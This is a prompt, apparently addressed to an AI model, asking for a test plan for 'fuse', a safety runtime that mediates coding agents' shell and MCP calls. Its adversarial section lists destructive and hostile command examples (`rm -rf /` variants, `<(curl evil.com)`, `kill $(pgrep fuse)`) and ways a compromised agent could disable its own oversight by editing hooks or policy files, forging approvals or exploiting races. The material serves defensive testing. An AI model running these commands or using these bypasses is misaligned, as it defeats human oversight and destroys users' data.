You are a senior `QA` engineer and security tester specializing in developer tooling and agent safety systems. Your task is to create a comprehensive test plan for "fuse" -- a Universal Agent Safety Runtime that mediates shell commands and `MCP` tool calls between coding agents and destructive execution paths.

## Context

Read the following specification files thoroughly before producing any output:

1. `specs/functional.md` -- product requirements, decision model, threat model, minimum rule coverage (§19)
2. `specs/technical.md` -- implementation spec: normalization pipeline (§5), rule engine (§6), file inspection (§7), approval system (§8-9), execution (§10), `MCP` proxy (§11)

## What fuse does

fuse sits between coding agents (Claude Code, Codex `CLI`) and the shell/MCP layer. It:
- Intercepts shell commands via Claude Code's `PreToolUse` hook or an `MCP` stdio proxy
- Normalizes commands (Unicode `NFKC`, `ANSI` stripping, compound splitting, basename extraction, wrapper stripping, inner command extraction)
- Classifies commands into `SAFE` / `CAUTION` / `APPROVAL` / `BLOCKED` using a layered rule engine (hardcoded → user policy → built-in presets → fallback)
- Inspects referenced script files (Python, shell, JS/TS) for dangerous patterns
- Presents an approval `TUI` for APPROVAL-classified commands
- Persists HMAC-signed approvals in `SQLite` with atomic consumption
- For `MCP`: runs a stdio proxy with two-layer classification (tool name + argument content)

## Deliverable

Produce a test plan document (`specs/testplan.md`) with the following structure:

### 1. Test strategy overview
- Testing philosophy (defense-in-depth, adversarial-first)
- Test pyramid: unit → integration → golden fixtures → end-to-end → adversarial
- Coverage targets and success criteria
- What is `NOT` tested and why (explicit scope boundaries)

### 2. Unit test plan
For each module, define test cases with:
- Input → expected output → rationale
- Edge cases and boundary conditions
- Error paths and failure modes

Cover at minimum:
- **Normalization pipeline** (§5.2-5.5): Unicode edge cases (homoglyphs, `NFKC` collisions, zero-width joiners, `RTL` overrides, combining characters), `ANSI` escape sequences (nested, malformed, 256-color, truecolor), compound command splitting (nested quotes, escaped semicolons, heredocs spanning splits), basename extraction (relative paths, symlinks, PATH-resolved commands), wrapper stripping (chained wrappers, wrappers with complex argument patterns like `sudo -u deploy -g staff env VAR=val`), inner command extraction (nested `bash -c` up to depth 3, `ssh -t host 'bash -c "inner"'`, extraction failure → `APPROVAL`)
- **Rule engine** (§6.1-6.6): Rule precedence (hardcoded > user > built-in > fallback), regex correctness for every single built-in rule (§6.3.1-6.3.21), context sanitization (single-quote masking, double-quote preservation, known-safe-verb exception), sudo escalation modifier at each classification level, sensitive env var detection, `MCP` two-layer classification
- **File inspection** (§7): Each scanner (Python, shell, JS/TS) with benign and malicious file variants, truncated files, symlinked files, files with mixed signals, unsupported file types → `CAUTION`, binary files, empty files, files exceeding size limit
- **Approval system** (§8-9): `HMAC` generation and verification, hash field ordering (length-prefixed), atomic consumption (concurrent consumption race), approval expiry, approval for different cwd/env combinations, `SQLite` schema migration, `WAL` checkpoint behavior, `secret.key` generation and permissions
- **Context sanitization** (§6.4): Interaction with every rule category -- ensure no false positives from data arguments, ensure no false negatives from sanitization hiding real commands
- **Safe command set** (§6.5): Every unconditionally safe command, every conditionally safe command with both safe and unsafe flag combinations
- **Credential scrubbing** (§9.5): Ensure sensitive values are scrubbed from event log entries

### 3. Integration test plan
- **Claude Code hook integration**: Correct stdin parsing, exit code semantics (0=allow, 2=block, 1=non-blocking error), stderr output format, timeout behavior, `settings.json` installation/removal
- **MCP proxy integration**: stdio message framing, request-response correlation, tool call interception, passthrough for non-tool messages, downstream validation, graceful shutdown
- **End-to-end command flow**: Command enters via hook → normalization → classification → (optional) file inspection → (optional) approval prompt → execution → event logging. Test with real Claude Code hook invocation if possible.
- **Policy loading**: `policy.yaml` parsing, user rule precedence over built-ins, `disabled_builtins`, invalid policy graceful degradation
- **CLI commands**: `fuse run`, `fuse install/uninstall`, `fuse doctor`, `fuse policy lint`, argument validation, error messages

### 4. Golden fixture test plan
Design the golden fixture corpus (`testdata/fixtures/`) with full coverage matrices:

- **commands.yaml**: At least 120 command fixtures organized by category. For each built-in rule, include at least one positive match and one near-miss that should `NOT` match. Include all normalization bypass variants (split flags, long flags, mixed flags, absolute paths, chained wrappers, compound commands).
- **scripts/**: Test script files for each scanner (Python, shell, JS/TS) with benign, suspicious, and dangerous variants. Include edge cases: comments that look like code, string literals containing dangerous patterns, dynamic imports, conditional dangerous calls.
- `**mcp_tools.yaml**`: `MCP` tool call fixtures covering all prefix patterns (SAFE/CAUTION/APPROVAL), argument content scanning, unmatched tool names → `CAUTION` fallback.

### 5. Adversarial / red team test plan
This is the most critical section. Design attacks that a malicious or compromised agent might attempt:

**5.1 Normalization bypass attacks**
- Unicode homoglyph substitution (Cyrillic "а" for Latin "a" in "terraform")
- Zero-width characters inserted between command letters
- `ANSI` escape sequences that visually hide command components
- Right-to-left override to reverse visual command order
- Mixed-script attacks (Latin + Cyrillic + Greek)
- Overlong UTF-8 encodings
- Combining characters that visually alter letters
- Null bytes mid-command

**5.2 Rule evasion attacks**
- Aliased commands (`alias rm='rm -rf'` then `rm /`)
- Shell variable expansion (`CMD=rm; $CMD -rf /`)
- Indirect execution via `xargs`, `parallel`, `watch`, `at`, `batch`
- Heredoc injection to smuggle commands past single-quote masking
- Process substitution (`<(curl evil.com)`)
- Brace expansion (`{rm,-rf,/}`)
- Glob expansion (`/bi?/rm -rf /`)
- Command substitution in arguments (`terraform $(echo destroy)`)
- Newline injection in `tool_input` `JSON`
- Environment variable smuggling via `.env` files
- Backgrounding destructive commands (`rm -rf / &`)

**5.3 Self-protection bypass attacks**
- Attempting to modify `~/.fuse/config/policy.yaml` via various write methods
- Attempting to modify `.claude/settings.json` to remove hooks
- Attempting to read/modify `fuse.db` via various database tools
- Attempting to `fuse disable` through nested shell invocations
- Attempting to kill the fuse process (`kill $(pgrep fuse)`)
- Attempting to replace the fuse binary
- Attempting to modify `secret.key`
- Symlink attacks: `ln -s ~/.fuse/config/policy.yaml /tmp/innocent.txt; echo 'bad' > /tmp/innocent.txt`

**5.4 Approval system attacks**
- Replaying a captured approval hash for a different command
- Modifying `SQLite` database to insert forged approvals (without valid `HMAC`)
- Race condition: consuming an approval twice concurrently
- Approval for command X, but executing command Y in the time gap (`TOCTOU`)
- Exhaustive approval farming (approving many small commands to build up to a big one)

**5.5 `MCP` proxy attacks**
- Malformed JSON-RPC messages
- Tool calls with argument values containing shell metacharacters
- Tool names designed to confuse prefix matching (`list_then_delete_all`)
- Oversized messages exceeding buffer limits
- Interleaved requests designed to confuse correlation

**5.6 File inspection bypass attacks**
- Polyglot files (valid Python `AND` valid shell)
- Files that change behavior based on environment variables
- Obfuscated code (base64 encoded payloads, rot13, string concatenation)
- Files that import dangerous modules conditionally (`if os.getenv('PROD'): import boto3`)
- Files exceeding the size limit where the dangerous code is past the truncation point
- Symlink chains (A → B → C → dangerous file)
- `TOCTOU`: file is safe at inspection time, modified before execution

### 6. Performance test plan
- Latency benchmarks: warm path (< 50ms target), cold path (< 150ms target)
- Throughput: commands per second under sustained load
- Regex compilation impact: measure all built-in regexes against pathological inputs (`ReDoS`)
- `SQLite` performance: approval lookup under concurrent access, `WAL` checkpoint timing
- Memory usage: baseline and under load, regex cache size
- Large command handling: commands near and exceeding the 64KB input limit

### 7. Compatibility test plan
- `macOS` (arm64, `x86_64`) and Linux (`x86_64`, arm64)
- Go 1.21+ (minimum) through latest
- Shell variations: bash, zsh, fish (for hook invocation context)
- Claude Code versions (hook protocol compatibility)
- `SQLite` version compatibility (`modernc.org/sqlite`)
- Unicode edge cases across different locale settings (`LC_ALL`, `LANG`)
- Terminal emulators: verify `TUI` approval prompt renders correctly

### 8. Regression test plan
- Every bug fix gets a golden fixture added
- Every review finding (`specs/review.md`) maps to at least one test
- `CI` pipeline: `go test ./...`, golden fixture validation, lint, vet, race detector

## Output format

For each test case, use this structure:
- **ID**: unique identifier (`e.g`., `UNIT-NORM-001`, `ADV-BYPASS-012`)
- **Category**: unit | integration | golden | adversarial | performance | compatibility
- **Component**: which module/section of the spec is being tested
- **Description**: what is being tested and why
- **Input**: exact input (command string, file content, `MCP` message, etc.)
- **Expected result**: exact expected classification, error, or behavior
- **Priority**: P0 (must have for v1) | P1 (should have) | P2 (nice to have)
- **Spec reference**: section number in `technical.md` or `functional.md`
- **Notes**: any implementation considerations

## Guidelines

- Be adversarial. Assume a sophisticated attacker who has read the source code.
- Prioritize attacks that could lead to silent bypass (the most dangerous failure mode -- fuse thinks a command is `SAFE` but it's actually destructive).
- Every built-in rule (§6.3.1-6.3.21) must have at least one positive test and one negative test.
- Every normalization step (§5.2-5.3) must have at least one bypass attempt.
- Test the `INTERACTIONS` between components, not just individual components. The seams between normalization, sanitization, and rule matching are where bugs hide.
- Consider the "confused deputy" problem: can an agent craft a command that looks safe to fuse but does something destructive?
- Do `NOT` generate placeholder tests. Every test must have a concrete input and expected output.
- Reference spec sections by number so tests are traceable to requirements.
